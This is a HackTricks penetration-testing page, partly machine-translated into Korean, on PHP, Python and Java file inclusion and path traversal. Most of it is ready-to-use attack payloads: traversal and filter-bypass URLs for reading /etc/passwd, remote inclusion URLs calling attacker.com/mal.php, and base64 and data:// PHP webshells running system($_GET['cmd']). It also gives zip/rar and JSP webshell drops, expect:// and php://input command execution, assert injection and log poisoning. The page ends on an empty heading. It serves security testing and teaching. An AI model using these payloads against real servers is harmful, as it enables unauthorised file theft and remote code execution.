# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** 파일이 원격 서버에서 로드됩니다 (최고의 경우: 코드를 작성하면 서버가 이를 실행합니다). In php this is **disabled** by default (**allow_url_include**).\
**Local File Inclusion (LFI):** 서버가 로컬 파일을 로드합니다.

취약점은 사용자가 서버가 로드할 파일을 어떤 식으로든 제어할 수 있을 때 발생합니다.

취약한 **PHP functions**: require, require_once, include, include_once

이 취약점을 익스플로잇하는 데 유용한 도구: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE 파일들
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**여러 *nix LFI 리스트를 혼합하고 경로를 추가하여 만든 리스트:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to add `../../../../../`

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

**다양한 wordlists의 병합:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to remove `C:/` and add `../../../../../`

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

linux의 LFI 리스트를 확인하세요.

## 기본 LFI 및 우회 기법

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences가 비재귀적으로 제거됨
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

제공된 문자열 끝에 추가되는 문자들을 우회 (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
이 내용은 **PHP 5.4 이후 해결되었습니다**

### **인코딩**

비표준 인코딩(예: double URL encode 등)을 사용할 수 있습니다:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

최신 HTML-to-PDF 엔진(예: **TCPDF** 또는 **html2pdf** 같은 래퍼)은 공격자가 제공한 HTML, SVG, CSS 및 폰트 URL을 기꺼이 파싱하지만, 이들은 파일시스템 접근 권한이 있는 신뢰된 백엔드 네트워크 내에서 실행됩니다. `$pdf->writeHTML()`/`Html2Pdf::writeHTML()`에 HTML을 주입할 수 있게 되면, 웹 서버 계정이 읽을 수 있는 로컬 파일을 자주 유출할 수 있습니다.

- **Fingerprint the renderer**: 생성된 PDF에는 항상 `Producer` 필드(예: `TCPDF 6.8.2`)가 포함됩니다. 정확한 빌드를 알면 어떤 경로 필터가 존재하는지, 검증 전에 URL 디코딩이 발생하는지를 알 수 있습니다.
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()`는 `<image>` 요소의 `xlink:href` 속성을 `urldecode()`를 실행하기 전에 읽습니다. 악성 SVG를 data URI 안에 임베드하면 많은 HTML sanitizers가 페이로드를 무시하지만 TCPDF는 여전히 이를 파싱합니다:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDF는 `/`로 시작하는 경로에 `$_SERVER['DOCUMENT_ROOT']`를 prepend하고 `..`는 나중에 해결하므로, prepend 이후 root를 벗어나려면 선행 `../../..` 세그먼트 또는 `/../../..`를 사용하세요.

- **Encoding to bypass naive filters**: Versions ≤6.8.2 only check for the literal substring `../` *before* decoding the URL. Sending `..%2f` (or `..%2F`) in the SVG or in a raw `<img src>` attribute bypasses the check, because the traversal dot-dot-slash sequence is recreated only after TCPDF calls `urldecode()`.
- **Double-encoding for multi-stage decoding**: If user input is decoded by the web framework *and* by TCPDF, double-encode the slash (`%252f`). One decode turns it into `%2f`, the second decode in TCPDF turns it into `/`, yielding `/..%252f..` → `/../../../…` without ever showing `../` to the early filter.
- **HTML `<img>` handler**: `TCPDF::openHTMLTagHandler()` contains the same order-of-operations bug, allowing direct HTML payloads such as `src="%2f..%252f..%252ftmp%252fsecret.png"` to read any locally reachable bitmap.

이 기법은 PDF worker가 읽을 수 있는 모든 것을 leaks 합니다 (여권 스캔, 이미지로 렌더링된 API keys 등). Hardeners는 경로를 정규화(`isRelativePath()`)하여 6.9.1에서 이를 수정했으므로, 테스트 시에는 구버전의 `Producer` 버전을 우선적으로 사용하세요.

### 기존 폴더에서

백엔드가 폴더 경로를 확인하고 있을 수도 있습니다:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Exploring File System Directories on a Server

서버의 파일 시스템은 특정 기법을 사용하여 파일뿐만 아니라 디렉터리도 재귀적으로 탐색할 수 있다. 이 과정은 디렉터리의 깊이를 파악하고 특정 폴더의 존재를 탐지하는 것을 포함한다. 아래는 이를 달성하기 위한 상세한 방법이다:

1. **디렉터리 깊이 결정:** 현재 디렉터리의 깊이는 `/etc/passwd` 파일을 성공적으로 가져와 확인한다(서버가 Linux 기반인 경우 적용). 예시 URL은 다음과 같이 구성될 수 있으며, 깊이(depth)가 3임을 나타낸다:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **폴더 탐색:** 의심되는 폴더 이름(예: `private`)을 URL에 추가한 다음, 다시 `/etc/passwd`로 이동합니다. 추가된 디렉터리 레벨 때문에 depth를 한 단계 증가시켜야 합니다:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **결과 해석:** 서버의 응답은 폴더의 존재 여부를 나타냅니다:
- **오류 / 출력 없음:** 지정한 위치에 `private` 폴더가 없을 가능성이 높습니다.
- **`/etc/passwd`의 내용:** `private` 폴더의 존재가 확인됩니다.
4. **재귀적 탐색:** 발견한 폴더는 동일한 기법이나 기존의 Local File Inclusion (LFI) 방법으로 서브디렉토리나 파일을 추가로 탐색할 수 있습니다.

파일 시스템의 다른 위치에 있는 디렉토리를 탐색하려면 payload를 적절히 조정하세요. 예를 들어, 현재 디렉토리가 깊이 3에 있다고 가정할 때 `/var/www/`에 `private` 디렉토리가 있는지 확인하려면 다음을 사용하세요:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation은 웹 애플리케이션에서 파일 경로를 조작하기 위해 사용하는 기법입니다. 주로 파일 경로 끝에 추가 문자를 붙이는 특정 보안 장치를 우회해 접근이 제한된 파일에 접근하는 데 사용됩니다. 목적은 보안 장치에 의해 변경된 후에도 원하는 파일을 가리키도록 파일 경로를 정교하게 만드는 것입니다.

In PHP에서는 파일 시스템의 특성상 파일 경로의 여러 표현이 동일한 것으로 간주될 수 있습니다. 예를 들어:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/`는 모두 동일한 경로로 처리됩니다.
- 마지막 6문자가 `passwd`일 때, 뒤에 `/`를 추가해 `passwd/`로 만들어도 대상 파일은 변경되지 않습니다.
- 마찬가지로 파일 경로에 `.php`가 붙은 경우(예: `shellcode.php`), 끝에 `/.`를 추가해도 접근되는 파일은 변경되지 않습니다.

다음 예제들은 민감한 내용(사용자 계정 정보) 때문에 흔히 목표가 되는 `/etc/passwd`에 접근하기 위해 Path truncation을 활용하는 방법을 보여줍니다:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
이러한 시나리오에서는 필요한 ../ 횟수가 약 2027개일 수 있지만, 이 숫자는 서버 구성에 따라 달라질 수 있습니다.

- **점 세그먼트와 추가 문자 사용**: Traversal 시퀀스 (`../`)에 추가적인 점 세그먼트와 문자를 결합하면 파일 시스템을 탐색할 수 있으며, 서버가 덧붙인 문자열을 효과적으로 무시할 수 있습니다.
- **필요한 ../ 횟수 결정**: 시행착오를 통해 루트 디렉터리로 이동한 뒤 `/etc/passwd`에 도달하기 위해 필요한 정확한 `../` 시퀀스 수를 찾을 수 있으며, 이때 덧붙여진 문자열(예: `.php`)은 무력화되지만 원하는 경로(`/etc/passwd`)는 그대로 유지됩니다.
- **가짜 디렉터리로 시작하기**: 경로를 존재하지 않는 디렉터리(예: `a/`)로 시작하는 것은 일반적인 관행입니다. 이 기법은 예방 조치로 사용되거나 서버의 경로 파싱 로직 요구사항을 충족시키기 위해 사용됩니다.

When employing path truncation techniques, 서버의 경로 파싱 동작과 파일시스템 구조를 이해하는 것이 중요합니다. 각 시나리오에 따라 다른 접근법이 필요할 수 있으며, 가장 효과적인 방법을 찾기 위해 테스트가 자주 필요합니다.

**이 취약점은 PHP 5.3에서 수정되었습니다.**

### **필터 우회 기법**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php에서는 기본적으로 비활성화되어 있습니다. 이는 **`allow_url_include`**가 **Off.** 이기 때문입니다. 작동하려면 **On**이어야 하며, 그 경우 서버에서 PHP 파일을 include하여 RCE를 얻을 수 있습니다:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
만약 어떤 이유로 **`allow_url_include`**가 **On**인데 PHP가 외부 웹페이지 접근을 **filtering**하고 있다면, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), 예를 들어 data protocol과 base64를 사용해 b64 PHP 코드를 디코드하여 egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 이전 코드에서는 마지막의 `+.txt`가 추가되었는데, 공격자가 `.txt`로 끝나는 문자열을 필요로 했기 때문입니다. 따라서 문자열은 그것으로 끝나고 b64 decode 후 그 부분은 단지 junk를 반환하며 실제 PHP 코드는 포함되어(따라서 실행)됩니다.

또 다른 예시로 **`php://` 프로토콜을 사용하지 않는** 경우는 다음과 같습니다:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python 루트 요소

다음과 같은 Python 코드에서:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
사용자가 **absolute path**를 **`file_name`**에 전달하면, **previous path is just removed**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
이는 [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> 구성 요소가 절대 경로인 경우, 이전의 모든 구성 요소는 버려지고 결합은 절대 경로 구성 요소에서 계속됩니다.

## Java 디렉토리 목록

Java에서 Path Traversal이 있고 파일 대신 **디렉토리를 요청하면**, **디렉토리 목록이 반환되는** 것으로 보입니다. 다른 언어에서는(내가 알기로는) 이런 일이 발생하지 않습니다.

## 상위 25개 매개변수

다음은 local file inclusion (LFI) vulnerabilities에 취약할 수 있는 상위 25개 매개변수 목록입니다 (출처: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHP wrappers 및 프로토콜을 이용한 LFI / RFI

### php://filter

PHP filters는 데이터를 읽거나 쓰기 전에 기본적인 **수정 작업을 수행**할 수 있게 해줍니다. 필터는 5가지 카테고리로 나뉩니다:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: 데이터에서 태그 제거( "<" 와 ">" 문자 사이의 모든 내용)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 다른 인코딩으로 변환합니다(`convert.iconv.<input_enc>.<output_enc>`). 지원되는 **모든 인코딩의 목록**을 얻으려면 콘솔에서 다음을 실행하세요: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: 콘텐츠를 압축(많은 정보를 exfiltrate할 때 유용)
- `zlib.inflate`: 데이터를 압축 해제
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 사용 중단됨
- `mdecrypt.*` : 사용 중단됨
- Other Filters
- php에서 `var_dump(stream_get_filters());` 를 실행하면 몇 가지 **예상치 못한 필터**를 찾을 수 있습니다:
- `consumed`
- `dechunk`: HTTP chunked 인코딩을 역변환
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" 부분은 대소문자를 구분하지 않습니다

### php filters를 oracle로 사용해 임의 파일 읽기

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) 에서는 서버에서 출력이 바로 반환되지 않아도 로컬 파일을 읽을 수 있는 기법을 제안한다. 이 기법은 **boolean exfiltration of the file (char by char) using php filters** 을 oracle로 사용하는 방식에 기반한다. 이는 php filters가 텍스트를 충분히 크게 만들어 php가 예외를 발생시키게 할 수 있기 때문이다.

원문 포스트에서 기법에 대한 자세한 설명을 찾을 수 있지만, 여기서는 간단한 요약을 제공한다:

- 코덱 **`UCS-4LE`**를 사용하여 텍스트의 선두 문자를 앞에 남기고 문자열의 크기가 기하급수적으로 증가하도록 한다.
- 이는 초기 문자가 올바르게 추정되었을 때 php가 트리거할 만큼 매우 큰 **텍스트를 생성하기 위해** 사용된다(php가 **오류**를 발생).
- **dechunk** 필터는 **첫 문자가 hexadecimal이 아니면 모든 것을 제거**하므로, 첫 문자가 hex인지 여부를 알 수 있다.
- 앞의 것과 결합하면(및 추정한 문자에 따라 다른 필터들과 함께) 충분한 변환을 수행했을 때 해당 문자가 더 이상 hexadecimal 문자가 되지 않는 시점을 보고 텍스트의 첫 글자를 추측할 수 있게 된다. 만약 hex이면 dechunk가 삭제하지 않고 초기 폭탄(initial bomb)이 php 오류를 발생시킨다.
- 코덱 **convert.iconv.UNICODE.CP930**은 모든 문자를 다음 문자로 변환한다(예: 이 코덱 적용 후: a -> b). 따라서 예를 들어 첫 문자가 `a`인지 알아내려면 이 코덱을 6번 적용하면 a->b->c->d->e->f->g 되어 해당 문자가 더 이상 hexadecimal 문자가 아니게 되고, 따라서 dechunk가 삭제하지 않아 php 오류가 초기 폭탄과 결합해 트리거된다.
- 처음에 **rot13** 같은 변환을 적용하면 n, o, p, q, r 같은 다른 문자를 leak할 수 있다(그리고 다른 codecs를 사용해 다른 문자들을 hex 범위로 이동시킬 수 있다).
- 초기 문자가 숫자인 경우에는 base64로 인코딩하고 처음 두 글자를 leak해서 숫자를 leak해야 한다.
- 최종 문제는 **초기 문자보다 더 많은 것을 leak하는 방법**을 찾는 것이다. 순서 변경 memory filters들인 **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** 등을 사용하면 문자들의 순서를 변경하여 텍스트의 다른 문자를 첫 위치로 가져올 수 있다.
- 그리고 더 많은 데이터를 얻기 위해 아이디어는 **convert.iconv.UTF16.UTF16**으로 시작 부분에 **2 bytes of junk data**를 생성하고, **UCS-4LE**를 적용해 그것이 다음 2바이트와 **pivot**하게 만든 다음, and d**elete the data until the junk data** (이것은 초기 텍스트의 첫 2바이트를 제거한다). 원하는 비트를 leak할 때까지 이 과정을 반복한다.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

이 wrapper는 프로세스가 열어둔 file descriptor에 접근할 수 있게 해준다. 열린 파일의 내용을 exfiltrate하는 데 잠재적으로 유용하다:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
또한 **php://stdin, php://stdout and php://stderr** 를 사용해 각각 **file descriptors 0, 1 and 2**에 접근할 수 있습니다(공격에서 어떻게 유용할지는 잘 모르겠습니다)

### zip:// and rar://

PHPShell이 들어있는 Zip 또는 Rar 파일을 업로드하고 접근합니다.\
rar protocol을 악용하려면 **별도로 활성화되어야 합니다**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
이 프로토콜은 php 설정 **`allow_url_open`** 및 **`allow_url_include`**에 의해 제한된다는 점에 유의하세요.

### expect://

Expect는 활성화되어 있어야 합니다. 다음을 사용해 코드를 실행할 수 있습니다:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST 파라미터에 payload를 지정하세요:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

웹 애플리케이션이 파일 로드를 위해 `include` 같은 함수를 사용할 때 `.phar` 파일을 이용해 PHP 코드를 실행할 수 있습니다. 아래 PHP 코드 스니펫은 `.phar` 파일을 생성하는 방법을 보여줍니다:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` 파일을 컴파일하려면, 다음 명령을 실행해야 합니다:
```bash
php --define phar.readonly=0 create_path.php
```
실행하면 `test.phar`라는 파일이 생성되며, 이는 Local File Inclusion (LFI) 취약점을 이용하는 데 악용될 수 있습니다.

LFI가 내부의 PHP 코드를 실행하지 않고 `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, 또는 `filesize()` 같은 함수로 파일 읽기만 수행하는 경우, `phar` 프로토콜을 이용한 파일 읽기와 연관된 deserialization vulnerability를 시도해볼 수 있습니다.

자세한 내용을 보려면 아래 문서를 참조하세요:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

PHP에서 php filters를 지원하는 **any arbitrary file read from PHP that supports php filters**를 악용하여 RCE를 얻을 수 있었습니다. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
매우 간단한 요약: PHP 힙의 **3 byte overflow**를 악용해 특정 크기의 free chunk 체인을 **alter the chain of free chunks**하도록 조작하여 임의의 주소에 **write anything in any address**가 가능해졌고, 그 결과 **`system`**을 호출하는 훅이 추가되었습니다.\
추가적인 php filters를 악용해 특정 크기의 chunk를 alloc하는 것이 가능했습니다.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 메모리나 임시 파일에 쓰기(파일 포함 공격에서 어떻게 유용할지는 잘 모르겠음)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — 로컬 파일시스템 접근
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL 접근
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL 접근
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 압축 스트림
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 패턴과 일치하는 경로명 찾기(출력 가능한 내용을 반환하지 않으므로 여기서는 별로 유용하지 않음)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 오디오 스트림(임의의 파일을 읽는 데는 유용하지 않음)

## LFI via PHP's 'assert'

PHP에서 문자열 내 코드를 실행할 수 있는 'assert' 함수를 다룰 때 Local File Inclusion (LFI)의 위험이 특히 큽니다. 입력값에 ".." 같은 directory traversal 문자가 포함되어 있는지 검사하지만 제대로 정화(sanitize)하지 않는 경우 특히 문제가 됩니다.

예를 들어, PHP 코드는 다음과 같이 directory traversal을 방지하도록 설계될 수 있습니다:
```bash
assert("strpos('$file', '..') === false") or die("");
```
이것이 traversal을 차단하려는 목적이지만, 의도치 않게 code injection을 위한 벡터를 만듭니다. 파일 내용을 읽기 위해 이를 악용하려면 공격자는 다음을 사용할 수 있습니다:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
마찬가지로, 임의의 시스템 명령을 실행하려면 다음을 사용할 수 있다:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> 이 기술은 당신이 **PHP 함수**의 **파일 경로**를 **제어**하지만 해당 파일의 내용을 볼 수 없는 경우(예: 단순한 호출 **`file()`**처럼 파일에 접근하지만 내용이 표시되지 않는 경우)에 관련이 있습니다.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

요약하면, 이 기법은 파일 내용을 매우 **큰** 크기로 만들기 위해 **"UCS-4LE" encoding**을 사용하여 파일을 여는 **PHP 함수**가 **error**를 발생시키도록 합니다.

그 다음 첫 글자를 leak하기 위해 필터 **`dechunk`** 를 **base64** 또는 **rot13** 같은 다른 필터들과 함께 사용하고, 마지막으로 필터 **convert.iconv.UCS-4.UCS-4LE** 및 **convert.iconv.UTF16.UTF-16BE** 를 사용하여 **문자들을 맨 앞에 배치하고 leak** 합니다.

**취약할 수 있는 함수들**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

기술적인 세부사항은 앞서 언급한 포스트를 확인하세요!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

파일을 수신/업로드하는 서버측 코드가 목적지 경로를 사용자 제어 데이터(예: 파일명 또는 URL)를 사용하여 canonicalising 및 검증 없이 구성하면, `..` 세그먼트와 절대 경로로 의도된 디렉터리를 벗어나 임의 파일 쓰기가 발생할 수 있습니다. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- 엔드포인트 또는 백그라운드 워커에서 경로/파일명을 받아 디스크에 내용을 기록하는 write primitive를 식별합니다 (예: message-driven ingestion, XML/JSON command handlers, ZIP extractors 등).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 의도된 저장 디렉터리에서 webroot로 빠져나오도록 하는 traversal 경로를 구성하고 webshell 내용을 포함시킵니다.
- 업로드된 payload에 접속해 명령을 실행합니다.

Notes:
- 쓰기 작업을 수행하는 취약 서비스는 비-HTTP 포트에서 리스닝할 수 있습니다(예: TCP 4004의 JMF XML listener). 메인 웹 포털(다른 포트)은 나중에 당신의 payload를 제공할 것입니다.
- Java 스택에서는 이러한 파일 쓰기가 보통 간단한 `File`/`Paths` 연결로 구현됩니다. 정규화(canonicalisation) 및 허용 목록(allow-listing)의 부재가 핵심 결함입니다.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
이 클래스의 버그를 무력화하는 하드닝:
- 정규화된(canonical) 경로로 해석하고 그 경로가 허용 목록에 등재된 기본 디렉터리의 하위인지 강제한다.
- `..`, 절대 루트, 또는 드라이브 문자가 포함된 경로는 거부한다; 생성된 파일명을 선호한다.
- writer를 저권한 계정으로 실행하고 쓰기 디렉터리를 서비스 루트와 분리한다.

## Remote File Inclusion

앞서 설명됨, [**follow this link**](#remote-file-inclusion).

### Apache/Nginx 로그 파일을 통해

Apache 또는 Nginx 서버가 include 함수 내부에서 **vulnerable to LFI**한 경우, **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**에 접근을 시도하고 **user agent** 또는 **GET parameter**에 **`<?php system($_GET['c']); ?>`** 같은 php 쉘을 넣은 뒤 그 파일을 include할 수 있다

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

이 방법은 다른 로그에서도 가능하지만 **주의할 것,** 로그 내부의 코드는 URL encoded 되어 있을 수 있어 쉘이 망가질 수 있다. 헤더 **authorisation "basic"**에는 "user:password"가 Base64로 포함되며 로그 내부에서 디코드된다. PHPShell은 이 헤더 안에 삽입될 수 있다.\
다른 가능한 로그 경로:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 액세스 로그를 읽어 GET-based auth tokens (token replay) 수집

